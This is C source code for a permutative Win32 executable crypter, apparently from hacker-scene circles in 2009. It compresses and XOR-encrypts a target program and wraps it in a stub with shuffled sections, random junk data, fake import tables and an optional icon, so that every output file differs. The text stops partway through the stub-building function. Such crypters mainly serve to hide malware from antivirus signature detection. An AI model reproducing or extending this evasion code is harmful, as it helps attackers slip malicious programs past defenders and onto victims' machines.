////////////////////
// =8-D
//
// by me
//
// copyrly 2009
//
// permutative win32 executable crypter.
//
// generated files should always be unique.
//
// code that isn't mine is credited in the source if I knew who to credit.
//
// compile w/ MSVC, you will need to fuck with project settings to get it compile correctly.
// disable optimizations & exception handling.
//
// if u rip & not give creds i beat up ur mom, u 'nam? jk u.
////////////////////

/*
We are dealing with the best educated generation in history.
They are a hundred times better educated than their grandparents,
and ten times more sophisticated.
There has never been such an open-minded group.
The problem is that no one is giving them anything fresh.
They've got a brain dressed up with nowhere to go.

  -Leary
*/

#include <windows.h>
#include "stub.cpp"
#include "aplib.h"

#include "engine.cpp"

void enc(BYTE* in, BYTE* out, DWORD size)
//encrypts a buffer.. kinda, but not really. just flips the high & low bits of each byte & xors against key.
{
	while (size--)
	{
		*out = (*in << 4) + (*in >> 4);
		*out = *out ^ *((BYTE*)&dwKey + (size % 4));
		out++;
		in++;
	}
}

DWORD Align(DWORD dwValue, DWORD dwAlignment)
//Returns dwValue aligned to the next multiple of dwAlignment
//dwAlignment cannot be 0
{
	if (dwAlignment && dwValue % dwAlignment)
		return (dwValue + dwAlignment) - (dwValue % dwAlignment);
	else
		return dwValue;
}

typedef struct
{
	LPVOID pCryptedData;
	LPVOID pEOFData;
	DWORD dwOrigSize;
	DWORD dwCryptSize;
	DWORD dwEOFSize;
} CRYPTEDFILE;

DWORD GetPhysicalPESize(LPVOID pMap)
//returns the physical size of a mapped PE (as indictated by headers) pointed to by pMap
{
	PIMAGE_NT_HEADERS pNT;
	PIMAGE_SECTION_HEADER pSections;

	WORD i;
	DWORD ret = 0;

	pNT = (PIMAGE_NT_HEADERS)((char*)pMap + ((PIMAGE_DOS_HEADER)pMap)->e_lfanew);
	pSections = (PIMAGE_SECTION_HEADER)((char*)&pNT->OptionalHeader + pNT->FileHeader.SizeOfOptionalHeader);

	for (i = 0; i < pNT->FileHeader.NumberOfSections; i++)
	{
		if (pSections[i].PointerToRawData + pSections[i].SizeOfRawData > ret)
			ret = pSections[i].PointerToRawData + pSections[i].SizeOfRawData;
	}

	return ret;
}

void PrepareFileDataForStub(LPCTSTR szFile, CRYPTEDFILE *Out)
//packs/encrypts a file and stores data in Out.
{
	HANDLE hFile, hMap;
	LPVOID pMap, workmem;

	PIMAGE_DOS_HEADER pDOS;
	PIMAGE_NT_HEADERS pNT;

	memset_((BYTE*)Out, 0, sizeof(CRYPTEDFILE));

	dwKey = rand();

	hFile = CreateFile(szFile, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, 0, NULL);
	if (hFile != INVALID_HANDLE_VALUE && GetFileSize(hFile, NULL))
	{
		hMap = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
		if (hMap)
		{
			pMap = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
			if (pMap)
			{
				pDOS = (PIMAGE_DOS_HEADER)pMap;
				if (pDOS->e_magic == IMAGE_DOS_SIGNATURE)
				{
					pNT = (PIMAGE_NT_HEADERS)((char*)pDOS + pDOS->e_lfanew);
					if (pNT->Signature == IMAGE_NT_SIGNATURE)
					{
						Out->dwOrigSize = GetPhysicalPESize(pMap);

						if (Out->dwOrigSize)
						{
							Out->dwEOFSize = GetFileSize(hFile, NULL) - Out->dwOrigSize;
							if ((LONG)Out->dwEOFSize >= 0)
							{
								Out->dwCryptSize = aP_max_packed_size(Out->dwOrigSize);
								Out->pCryptedData = VirtualAlloc(NULL, Out->dwCryptSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
								if (Out->pCryptedData)
								{
									if (Out->dwEOFSize)
									{
										Out->pEOFData = VirtualAlloc(NULL, Out->dwEOFSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
									}

									workmem = VirtualAlloc(NULL, aP_workmem_size(Out->dwCryptSize), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
									if (workmem)
									{
										Out->dwCryptSize = aP_pack(pMap, Out->pCryptedData, Out->dwOrigSize, workmem, NULL, NULL);

										if ((LONG)Out->dwCryptSize > 0 && Out->dwCryptSize <= Out->dwOrigSize)
										{
											VirtualFree(workmem, 0, MEM_RELEASE);
											workmem = VirtualAlloc(NULL, Out->dwCryptSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
											enc((BYTE*)Out->pCryptedData, (BYTE*)workmem, Out->dwCryptSize);
											memcpy(Out->pCryptedData, workmem, Out->dwCryptSize);
										}

										VirtualFree(workmem, 0, MEM_RELEASE);

										//eof data if there is any.
										if (Out->dwEOFSize && Out->pEOFData)
										{
											memcpy(Out->pEOFData, (char*)pMap + Out->dwOrigSize, Out->dwEOFSize);
										}
									}
								}
							}
						}
					}
				}
				UnmapViewOfFile(pMap);
			}
			CloseHandle(hMap);
		}
		CloseHandle(hFile);
	}
}




typedef struct
{
	DWORD dwOldVA;
	DWORD dwNewVA;
} STUBOFFSETS;

typedef struct
{
	BYTE IsCodeOrData; //0 for code, 1 for data
	BYTE FixVAs;
	LPVOID pCodeData;
	DWORD dwOldSize;
	DWORD dwNewSize;
	STUBOFFSETS Offsets;
} STUBCODEENTRY;

#define NUM_STUB_SECTIONS 6

STUBCODEENTRY stubsections[NUM_STUB_SECTIONS] = { 0 };

void PrepareStubSectionsInfo(CRYPTEDFILE* CryptedData)
//prepares structures that keep track of the code & data for the stub.
{
	PIMAGE_DOS_HEADER pDOS;
	PIMAGE_NT_HEADERS pNT;
	PIMAGE_SECTION_HEADER pSections;

	WORD i, x;

	pDOS = (PIMAGE_DOS_HEADER)GetModuleHandle(NULL);
	pNT = (PIMAGE_NT_HEADERS)((char*)pDOS + pDOS->e_lfanew);

	pSections = (PIMAGE_SECTION_HEADER)((char*)&pNT->OptionalHeader + pNT->FileHeader.SizeOfOptionalHeader);

	for (i = 0, x = 0; i < pNT->FileHeader.NumberOfSections && x < NUM_STUB_SECTIONS; i++)
	{
		if (!memcmp(pSections[i].Name, ".loader", 7) || !memcmp(pSections[i].Name, ".sdata", 6) ||
			!memcmp(pSections[i].Name, ".cnsts", 6))
		{
			stubsections[x].Offsets.dwOldVA = (DWORD)pDOS + pSections[i].VirtualAddress;
			stubsections[x].FixVAs = 1;
			stubsections[x].dwOldSize = pSections[i].Misc.VirtualSize;

			//is code section or data section (section characteristics set by compiler)
			if (pSections[i].Characteristics == 0xF0000020) //== code, data == 0xD0000040
			{
				stubsections[x].IsCodeOrData = 0;
				stubsections[x].dwNewSize = 153600 + ((DWORD)rand() % 1048576);
				stubsections[x].pCodeData = VirtualAlloc(NULL, stubsections[x].dwNewSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
			}
			else
			{
				stubsections[x].IsCodeOrData = 1;
				stubsections[x].dwNewSize = pSections[i].Misc.VirtualSize;
				stubsections[x].pCodeData = (LPVOID)stubsections[x].Offsets.dwOldVA;
			}

			x++;
		}
	}

	//add files sections array.
	for (i = 0; i < dwNumFiles; i++)
	{
		stubsections[x].dwNewSize = CryptedData[i].dwCryptSize;
		stubsections[x].dwOldSize = stubsections[x].dwNewSize;
		stubsections[x].FixVAs = 0;
		stubsections[x].IsCodeOrData = 0; //place compressed files in code section.
		stubsections[x].Offsets.dwOldVA = (DWORD)CryptedData[i].pCryptedData;
		stubsections[x].Offsets.dwNewVA = 0;
		stubsections[x++].pCodeData = CryptedData[i].pCryptedData;
	}

	//& FileInfo array
	stubsections[x].dwNewSize = sizeof(FileInfo) * dwNumFiles;
	stubsections[x].dwOldSize = stubsections[x].dwNewSize;
	stubsections[x].FixVAs = 0;
	stubsections[x].IsCodeOrData = 1;
	stubsections[x].Offsets.dwOldVA = (DWORD)pFileArray;
	stubsections[x].Offsets.dwNewVA = 0;
	stubsections[x].pCodeData = pFileArray;

	//& junk data section
	stubsections[++x].dwNewSize = 5120 + (rand() % 5121);
	stubsections[x].dwOldSize = stubsections[x].dwNewSize;
	stubsections[x].FixVAs = 0;
	stubsections[x].IsCodeOrData = 1;
	stubsections[x].Offsets.dwOldVA = (DWORD)VirtualAlloc(NULL, stubsections[x].dwNewSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	stubsections[x].Offsets.dwNewVA = 0;
	stubsections[x].pCodeData = (void*)stubsections[x].Offsets.dwOldVA;

	for (BYTE* h = (BYTE*)stubsections[x].pCodeData; h < (BYTE*)stubsections[x].pCodeData + stubsections[x].dwOldSize; h++)
		*h = (BYTE)rand();

}

void MixSections()
{
	DWORD i = 1024;
	WORD a, b;

	STUBCODEENTRY tmp;

	while (i--)
	{
		a = rand() % NUM_STUB_SECTIONS;
		b = rand() % NUM_STUB_SECTIONS;

		if (a == b)
		{
			i++;
			continue;
		}

		tmp = stubsections[a];
		stubsections[a] = stubsections[b];
		stubsections[b] = tmp;
	}
}

void MapStubSections(DWORD dwCodeSectionVA, DWORD dwDataSectionVA, CRYPTEDFILE *CryptedData)
//fixes va's in stub sections & file array.
{
	DWORD dwCodeWritten = 0, dwDataWritten = 0;

	WORD i = 25, x;

	//mix sections.
	while (i--)
		MixSections();

	//calc newva's for sections
	for (i = 0; i < NUM_STUB_SECTIONS; i++)
	{
		if (stubsections[i].IsCodeOrData == 0)
		{
			stubsections[i].Offsets.dwNewVA = dwCodeSectionVA + dwCodeWritten;
			dwCodeWritten += stubsections[i].dwNewSize;
		}
		else
		{
			stubsections[i].Offsets.dwNewVA = dwDataSectionVA + dwDataWritten;
			dwDataWritten += stubsections[i].dwNewSize;
		}
	}

	//pfileArray
	for (i = 0; i < NUM_STUB_SECTIONS; i++)
	{
		for (x = 0; x < dwNumFiles; x++)
		{
			if (stubsections[i].pCodeData == CryptedData[x].pCryptedData)
			{
				pFileArray[x].dwAddress = stubsections[i].Offsets.dwNewVA;
				break;
			}
		}
	}
}

DWORD StubSectionsSize(BYTE bType)
//returns size of code, data or all stub sections depending on bType.
//bType can be:
//0 = total size of code sections
//1 = total size of data sections
//else = total size of all sections
{
	DWORD i, ret = 0;

	for (i = 0; i < NUM_STUB_SECTIONS; i++)
	{
		if (stubsections[i].IsCodeOrData == bType || bType > 1)
		{
			ret += stubsections[i].dwNewSize;
		}
	}

	return ret;
}

DWORD OldVAToNewVA(DWORD OldVA)
{
	WORD i = 0;

	for (; i < NUM_STUB_SECTIONS; i++)
	{
		if (OldVA >= stubsections[i].Offsets.dwOldVA && OldVA <= stubsections[i].Offsets.dwOldVA + stubsections[i].dwOldSize)
		{
			return stubsections[i].Offsets.dwNewVA + (OldVA - stubsections[i].Offsets.dwOldVA);
		}
	}
	return 0;
}

typedef struct
{
	char* szName;
	WORD UsedAlready;
} whatever;

whatever DLLNAMES[] = {
	{ "KERNEL32.dll", 0 }, 
	{ "USER32.dll", 0 }, 
	{ "GDI32.dll", 0 }, 
	{ "OLE32.dll", 0 }, 
	{ "COMDLG32.dll", 0 }, 
	{ "OLEAUT32.dll", 0 },
	{ "SHELL32.dll", 0 }
};

LPVOID FakeImports(DWORD dwImportDataRVA, DWORD *dwOutSize, DWORD *dwIATSize, DWORD* dwImportsSize)
//makes a fake import section. probably useless. sounded good when i was high.
{
	//imports structure:

	//iat data (thunks pointing to names) //first thunk in imports sections
	//..
	//imports
	//..
	//imports.originalthunks (copy of iat data)
	//..
	//dll name x
	//imports (by name) from x
	//(repeat)
	//..


	DWORD dwTotalNames = 0, dwTotalLibs, we, *Names, *Functions, x;

	WORD i, *Ordinals;

	HMODULE hLib;

	LPVOID pBuffer;

	PIMAGE_THUNK_DATA pFirstThunks, pOriginalThunks;
	PIMAGE_IMPORT_DESCRIPTOR pImports;
	PIMAGE_IMPORT_BY_NAME pNamesStart, pNamesPtr, iter;

	PIMAGE_EXPORT_DIRECTORY pExports;

	//picks 2 to 5 entries from dllnames.
	//randomly picks 10 to 20 (different) names from each entry

	pBuffer = VirtualAlloc(NULL, *dwOutSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	dwTotalLibs = 2 + (rand() % 4);
	we = dwTotalLibs;

	while (we--)
	{
		x = 0;
		do
		{
			i = rand() % (sizeof(DLLNAMES) / sizeof(whatever));
				
		} while (DLLNAMES[i].UsedAlready && ++x < 1000);

		if (x == 1000)
			break;

		DLLNAMES[i].UsedAlready = 10 + (rand() % 10);
		dwTotalNames += DLLNAMES[i].UsedAlready;
	}

	if (we != (DWORD)-1 && we)
		dwTotalLibs = we;

	*dwIATSize = sizeof(IMAGE_THUNK_DATA) * (dwTotalNames + dwTotalLibs);
	pFirstThunks = (PIMAGE_THUNK_DATA)pBuffer;
	pImports = (PIMAGE_IMPORT_DESCRIPTOR)((char*)pFirstThunks + *dwIATSize);
	pOriginalThunks = (PIMAGE_THUNK_DATA)((char*)pImports + (sizeof(IMAGE_IMPORT_DESCRIPTOR) * (dwTotalLibs + 1)));
	pNamesStart = (PIMAGE_IMPORT_BY_NAME)Align(((DWORD)pOriginalThunks + *dwIATSize), 2);


	we = dwTotalLibs;
	while (we--)
	{
		x = 0;
		do
		{
			i = rand() % (sizeof(DLLNAMES) / sizeof(whatever));
		} while (!DLLNAMES[i].UsedAlready && ++x < 1000);

		if (x == 1000)
			break;

		hLib = LoadLibrary(DLLNAMES[i].szName);

		if (hLib)
		{
			pExports = (PIMAGE_EXPORT_DIRECTORY)((DWORD)hLib + ((PIMAGE_NT_HEADERS)((DWORD)hLib + ((PIMAGE_DOS_HEADER)hLib)->e_lfanew))->OptionalHeader.DataDirectory[0].VirtualAddress);
			if (pExports != (PIMAGE_EXPORT_DIRECTORY)hLib && pExports->NumberOfNames)
			{
				//write name, import descriptor
				lstrcpy((LPTSTR)pNamesStart->Name, DLLNAMES[i].szName);
				pImports->FirstThunk = dwImportDataRVA + ((DWORD)pFirstThunks - (DWORD)pBuffer);
				pImports->Name = dwImportDataRVA + ((DWORD)pNamesStart->Name - (DWORD)pBuffer);
				pImports->OriginalFirstThunk = dwImportDataRVA + ((DWORD)pOriginalThunks - (DWORD)pBuffer);

				pNamesPtr = (PIMAGE_IMPORT_BY_NAME)Align(((DWORD)pNamesStart + 2 + lstrlen(DLLNAMES[i].szName) + 1), 2);

				Names = (DWORD*)((DWORD)hLib + pExports->AddressOfNames);
				Ordinals = (WORD*)((DWORD)hLib + pExports->AddressOfNameOrdinals);
				Functions = (DWORD*)((DWORD)hLib + pExports->AddressOfFunctions);

				//write thunks
				//pick a random # (DLLNAMES[i].UsedAlready) of named api. (i assume hint in thunk data is supposed to be ordinals[x] value, but i have no idea really.)
				do
				{
					x = rand() % pExports->NumberOfNames;
					for (iter = pNamesStart; iter < pNamesPtr; iter = (PIMAGE_IMPORT_BY_NAME)Align(((DWORD)iter + 2 + lstrlen((LPCTSTR)iter->Name) + 1), 2))
					{
						if (iter->Hint == Ordinals[x])
						{
							x = (WORD)-1;
							break;
						}
					}
					if (x == (WORD)-1)
					{
						DLLNAMES[i].UsedAlready++;
						continue;
					}

					pNamesPtr->Hint = Ordinals[x];
					lstrcpy((LPTSTR)pNamesPtr->Name, (LPCTSTR)hLib + Names[x]);

					pFirstThunks->u1.AddressOfData = dwImportDataRVA + ((DWORD)pNamesPtr - (DWORD)pBuffer);
					*pOriginalThunks++ = *pFirstThunks++;

					pNamesPtr = (PIMAGE_IMPORT_BY_NAME)Align(((DWORD)pNamesPtr + 2 + lstrlen((LPCTSTR)pNamesPtr->Name) + 1), 2);

				} while (--DLLNAMES[i].UsedAlready);
				pFirstThunks++;
				pOriginalThunks++;

				for (iter = pNamesStart; iter < pNamesPtr; iter = (PIMAGE_IMPORT_BY_NAME)Align(((DWORD)iter + 2 + lstrlen((LPCTSTR)iter->Name) + 1), 2))
				{
					iter->Hint = 0;
				}

				pImports++;
				pNamesStart = pNamesPtr;
			}
		}

		DLLNAMES[i].UsedAlready = 0;
	}

	*dwOutSize = (DWORD)pNamesPtr - (DWORD)pBuffer;
	*dwImportsSize = *dwOutSize - *dwIATSize;
	return pBuffer;
}

#pragma pack(1)
typedef struct
{
    BYTE        bWidth;
    BYTE        bHeight;
    BYTE        bColorCount;
    BYTE        bReserved;
    WORD        wPlanes;
    WORD        wBitCount;
    DWORD       dwBytesInRes;
    DWORD       dwImageOffset;
} ICONDIRENTRY, *LPICONDIRENTRY;
#pragma pack()

#pragma pack(1)
typedef struct
{
    WORD           idReserved;
    WORD           idType;
    WORD           idCount;
    ICONDIRENTRY   idEntries[1];
} ICONDIR, *LPICONDIR;
#pragma pack()

#pragma pack(1)
typedef struct
{
   BYTE   bWidth;
   BYTE   bHeight;
   BYTE   bColorCount;
   BYTE   bReserved;
   WORD   wPlanes;
   WORD   wBitCount;
   DWORD   dwBytesInRes;
   WORD   nID;
} GRPICONDIRENTRY, *LPGRPICONDIRENTRY;
#pragma pack()

#pragma pack(1)
typedef struct 
{
   WORD            idReserved;
   WORD            idType;
   WORD            idCount;
   GRPICONDIRENTRY   idEntries[1];
} GRPICONDIR, *LPGRPICONDIR;
#pragma pack()

void* CreateIconResources(LPCTSTR szIcon, DWORD dwRsrcSectionRVA, DWORD *dwRsrcSize)
//creates a resource tree w/ a main icon.
{
	HANDLE hIcon, hMap;
	LPVOID pMap, pRet = NULL;

	LPICONDIR lpIconDir;
	LPGRPICONDIR lpGrpRsrc;

	PIMAGE_RESOURCE_DIRECTORY pRsrcStart, pRsrcDir;
	PIMAGE_RESOURCE_DIRECTORY_ENTRY pRsrcEntry;
	PIMAGE_RESOURCE_DATA_ENTRY pRsrcData;

	WORD i;

	DWORD dwresdatasize, ressize;

	hIcon = CreateFile(szIcon, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, 0, NULL);
	if (hIcon != INVALID_HANDLE_VALUE)
	{
		hMap = CreateFileMapping(hIcon, NULL, PAGE_READONLY, 0, 0, NULL);
		if (hMap)
		{
			pMap = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
			if (pMap)
			{

				lpIconDir = (LPICONDIR)pMap;
				if (lpIconDir->idType == 1 && lpIconDir->idCount)
				{
					lpGrpRsrc = (LPGRPICONDIR)malloc(6 + (sizeof(GRPICONDIRENTRY) * lpIconDir->idCount));

					memcpy(lpGrpRsrc, lpIconDir, 6);

					dwresdatasize = 6 + (sizeof(GRPICONDIRENTRY) * lpIconDir->idCount);
					for (i = 0; i < lpIconDir->idCount; i++)
					{
						memcpy(&lpGrpRsrc->idEntries[i], &lpIconDir->idEntries[i], 12);
						lpGrpRsrc->idEntries[i].nID = i + 1;
						dwresdatasize += lpGrpRsrc->idEntries[i].dwBytesInRes;
					}

					ressize = sizeof(IMAGE_RESOURCE_DIRECTORY) + (sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY) * 2); //root dir & entries;
					ressize += sizeof(IMAGE_RESOURCE_DIRECTORY) + (sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY) * lpGrpRsrc->idCount); //icon dir & entries
					ressize += sizeof(IMAGE_RESOURCE_DIRECTORY) + sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY); //grp_icon dir & entry
					ressize += (sizeof(IMAGE_RESOURCE_DIRECTORY) + sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY)) * lpGrpRsrc->idCount; //icon subdirs & entries
					ressize += sizeof(IMAGE_RESOURCE_DIRECTORY) + sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY); //grp_icon subdir & entry
					ressize += sizeof(IMAGE_RESOURCE_DATA_ENTRY) * lpGrpRsrc->idCount; //icon data entries
					ressize += sizeof(IMAGE_RESOURCE_DATA_ENTRY); //grp icon data entry.


					pRsrcStart = (PIMAGE_RESOURCE_DIRECTORY)VirtualAlloc(NULL, ressize + dwresdatasize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);//malloc(ressize);

					//build rsrc tree.
					memset(pRsrcStart, 0, ressize + dwresdatasize);

					pRsrcStart->NumberOfIdEntries = 2;

					pRsrcEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pRsrcStart + 1);

					//icon main entry
					pRsrcEntry[0].Name = 3;
					pRsrcEntry[0].DataIsDirectory = 1;
					pRsrcEntry[0].OffsetToDirectory = sizeof(IMAGE_RESOURCE_DIRECTORY) + (sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY) * 2);

					//grp icon main entry
					pRsrcEntry[1].Name = pRsrcEntry[0].Name + 11;
					pRsrcEntry[1].DataIsDirectory = 1;
					pRsrcEntry[1].OffsetToDirectory = pRsrcEntry[0].OffsetToDirectory + sizeof(IMAGE_RESOURCE_DIRECTORY) + (sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY) * lpGrpRsrc->idCount);

					pRsrcDir = (PIMAGE_RESOURCE_DIRECTORY)(pRsrcEntry + 2);

					//icon dir & entries
					pRsrcDir->NumberOfIdEntries = lpGrpRsrc->idCount;
					pRsrcEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pRsrcDir + 1);
					for (i = 0; i < pRsrcDir->NumberOfIdEntries; i++)
					{
						pRsrcEntry[i].DataIsDirectory = 1;
						pRsrcEntry[i].OffsetToDirectory = (DWORD)(((char*)(pRsrcEntry + pRsrcDir->NumberOfIdEntries) + sizeof(IMAGE_RESOURCE_DIRECTORY) + sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY)) - (char*)pRsrcStart) + ((sizeof(IMAGE_RESOURCE_DIRECTORY) + sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY)) * i);

						pRsrcEntry[i].Name = i + 1;
					}

					//grp icon dir & entry
					pRsrcDir = (PIMAGE_RESOURCE_DIRECTORY)(pRsrcEntry + i);
					pRsrcEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pRsrcDir + 1);
					pRsrcDir->NumberOfIdEntries = 1;
					pRsrcEntry->Name = 1;
					pRsrcEntry->DataIsDirectory = 1;
					pRsrcEntry->OffsetToDirectory = (DWORD)((char*)(pRsrcEntry + 1) - (char*)pRsrcStart) + ((sizeof(IMAGE_RESOURCE_DIRECTORY) + sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY)) * lpGrpRsrc->idCount);

					//icon sub-dirs & entries
					pRsrcDir = (PIMAGE_RESOURCE_DIRECTORY)(pRsrcEntry + 1);
					pRsrcEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pRsrcDir + 1);
					for (i = 0; i < lpGrpRsrc->idCount; i++)
					{
						pRsrcDir->NumberOfIdEntries = 1;
						pRsrcEntry->OffsetToData = (DWORD)((char*)pRsrcDir - (DWORD)pRsrcStart) + ((sizeof(IMAGE_RESOURCE_DIRECTORY) + sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY)) * ((lpGrpRsrc->idCount - i) + 1)) + (sizeof(IMAGE_RESOURCE_DATA_ENTRY) * i);//uhhh...

						pRsrcEntry->Name = 0x0409;

						pRsrcDir = (PIMAGE_RESOURCE_DIRECTORY)(pRsrcEntry + 1);
						pRsrcEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pRsrcDir + 1);
					}

					//grp icon sub-dir & entry
					pRsrcDir->NumberOfIdEntries = 1;
					pRsrcEntry->Name = 0x0409;
					pRsrcEntry->OffsetToData = (DWORD)((char*)(pRsrcEntry + 1) - (DWORD)pRsrcStart) + (sizeof(IMAGE_RESOURCE_DATA_ENTRY) * lpGrpRsrc->idCount);

					//data entries
					pRsrcData = (PIMAGE_RESOURCE_DATA_ENTRY)(pRsrcEntry + 1);
					dwresdatasize = 0;
					for (i = 0; i < lpGrpRsrc->idCount; i++)
					{
						pRsrcData[i].OffsetToData = dwRsrcSectionRVA + ressize + dwresdatasize;
						pRsrcData[i].Size = lpGrpRsrc->idEntries[i].dwBytesInRes;
						dwresdatasize += pRsrcData[i].Size;
					}

					pRsrcData += lpGrpRsrc->idCount;
					pRsrcData->OffsetToData = dwRsrcSectionRVA + ressize + dwresdatasize;
					pRsrcData->Size = 6 + (sizeof(GRPICONDIRENTRY) * lpGrpRsrc->idCount);
					dwresdatasize += pRsrcData->Size;

					//finished w/ tree, write data to buffer and done.
					pRsrcData = (PIMAGE_RESOURCE_DATA_ENTRY)(pRsrcEntry + 1);
					pRsrcData = (PIMAGE_RESOURCE_DATA_ENTRY)((char*)pRsrcData - (DWORD)pRsrcStart);

					pRsrcData = (PIMAGE_RESOURCE_DATA_ENTRY)((char*)pRsrcData + (DWORD)pRsrcStart);
					for (i = 0; i < lpGrpRsrc->idCount; i++)
					{
						pRsrcData[i].OffsetToData = pRsrcData[i].OffsetToData;

						memcpy((char*)pRsrcStart + (pRsrcData[i].OffsetToData - dwRsrcSectionRVA), (char*)pMap + lpIconDir->idEntries[i].dwImageOffset, lpIconDir->idEntries[i].dwBytesInRes);
					}

					pRsrcData += lpGrpRsrc->idCount;
					memcpy((char*)pRsrcStart + (pRsrcData->OffsetToData - dwRsrcSectionRVA), lpGrpRsrc, 6 + (sizeof(GRPICONDIRENTRY) * lpGrpRsrc->idCount));

					//done, cleanup
					free(lpGrpRsrc);

					*dwRsrcSize = ressize + dwresdatasize;
					pRet = pRsrcStart;
				}

				UnmapViewOfFile(pMap);
			}
			CloseHandle(hMap);
		}
		CloseHandle(hIcon);
	}
	return pRet;
}

void FixVAs(DWORD OldBase, DWORD ImgSize, DWORD NewBase)
//fix static va's in compiled stub code.
{
	char *x;
	WORD i, j;
	for (i = 0; i < NUM_STUB_SECTIONS; i++)
	{
		if (stubsections[i].FixVAs == 0)
			continue;

		for (x = (char*)stubsections[i].Offsets.dwOldVA; x < (char*)stubsections[i].Offsets.dwOldVA + stubsections[i].dwOldSize; x++)
		{
			if (*(DWORD*)x >= OldBase && *(DWORD*)x < OldBase + ImgSize)
			{
				for (j = 0; j < NUM_STUB_SECTIONS; j++)
				{
					if (stubsections[i].FixVAs == 0)
						continue;

					if (*(DWORD*)x >= stubsections[j].Offsets.dwOldVA && *(DWORD*)x < stubsections[j].Offsets.dwOldVA + stubsections[j].dwOldSize) //oldsize
					{
						*(DWORD*)x -= stubsections[j].Offsets.dwOldVA;
						*(DWORD*)x += NewBase + stubsections[j].Offsets.dwNewVA;
						break;
					}
				}
			}
		}
	}
}

DWORD WriteSectionsToFile(HANDLE hFile, BYTE bType)
//write sections to file.
{
	WORD i;
	DWORD ret = 0, dwbytes;

	for (i = 0; i < NUM_STUB_SECTIONS; i++)
	{
		if (stubsections[i].IsCodeOrData == bType || bType > 1)
		{
			WriteFile(hFile, (LPCVOID)stubsections[i].pCodeData, stubsections[i].dwNewSize, &dwbytes, NULL);
			ret += dwbytes;
		}
	}

	return ret;
}

void BuildStub(LPCTSTR szOutput, CRYPTEDFILE* CryptedData)
//build stub.
{
	LPVOID pMe;

	IMAGE_DOS_HEADER stubDOS;
	IMAGE_NT_HEADERS stubNT;
	PIMAGE_SECTION_HEADER pstubSections;

	WORD i, k;

	LPVOID pImportData;
	DWORD dwImportRawSize, dwIATSize, dwImportsSize, dwEP;

	LPVOID pResData;
	DWORD dwResSize;
	BOOL bIcon = FALSE;
	OPENFILENAME ofn;
	char szIcon[MAX_PATH+1] = "\0";

	memset(&ofn, 0, sizeof(OPENFILENAME));
	ofn.lStructSize = sizeof(OPENFILENAME);
	ofn.hInstance = GetModuleHandle(NULL);
	ofn.lpstrFilter = "Icons\0*.ico\0\0";
	ofn.lpstrFile = szIcon;
	ofn.nMaxFile = MAX_PATH;
	ofn.lpstrTitle = "Select Icon";
	ofn.Flags = OFN_FILEMUSTEXIST;

	char szDir[MAX_PATH+1];
	if (MessageBox(0, "Add icon to crypted file?", "Icon", MB_YESNO | MB_ICONQUESTION) == IDYES)
	{
		GetCurrentDirectory(MAX_PATH, szDir);
		if (GetOpenFileName(&ofn) != 0)
			bIcon = TRUE;
		SetCurrentDirectory(szDir);
	}

	pMe = GetModuleHandle(NULL);

	stubDOS = *((PIMAGE_DOS_HEADER)pMe);
	stubNT = *((PIMAGE_NT_HEADERS)((char*)pMe + stubDOS.e_lfanew));

	memset(&stubNT.OptionalHeader.DataDirectory, 0, stubNT.OptionalHeader.NumberOfRvaAndSizes * sizeof(IMAGE_DATA_DIRECTORY));

	//prepare stubNT data.
	stubNT.FileHeader.NumberOfSections = 3;
	if (bIcon)
		stubNT.FileHeader.NumberOfSections++;

	stubNT.FileHeader.TimeDateStamp = 0;// w\e do that shit later.

	stubNT.OptionalHeader.CheckSum = 0; //CheckSumMappedFile, later.

	stubNT.OptionalHeader.SectionAlignment = 0x1000;

	while (stubNT.OptionalHeader.SectionAlignment > 0x200 && rand() % 3) //set new alignment
		stubNT.OptionalHeader.SectionAlignment /= 2;
	stubNT.OptionalHeader.FileAlignment = stubNT.OptionalHeader.SectionAlignment;

	//new header size
	stubNT.OptionalHeader.SizeOfHeaders = Align(stubDOS.e_lfanew + (sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + stubNT.FileHeader.SizeOfOptionalHeader) + (sizeof(IMAGE_SECTION_HEADER) * stubNT.FileHeader.NumberOfSections), stubNT.OptionalHeader.FileAlignment);
	stubNT.OptionalHeader.SizeOfUninitializedData = 0;

	//create section headers
	pstubSections = (PIMAGE_SECTION_HEADER)VirtualAlloc(NULL, sizeof(IMAGE_SECTION_HEADER) * stubNT.FileHeader.NumberOfSections, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	//.text (code)
	//.rdata (imports)
	//.data (data)
	//.rsrc (resources, optional)
	memcpy(pstubSections[0].Name, ".text", 5);
//	pstubSections[0].Misc.VirtualSize = Align(StubSectionsSize(0), stubNT.OptionalHeader.SectionAlignment);
	pstubSections[0].Misc.VirtualSize = StubSectionsSize(0);
	pstubSections[0].Characteristics = 0x60000020;
	pstubSections[0].PointerToRawData = Align(stubNT.OptionalHeader.SizeOfHeaders, stubNT.OptionalHeader.FileAlignment);
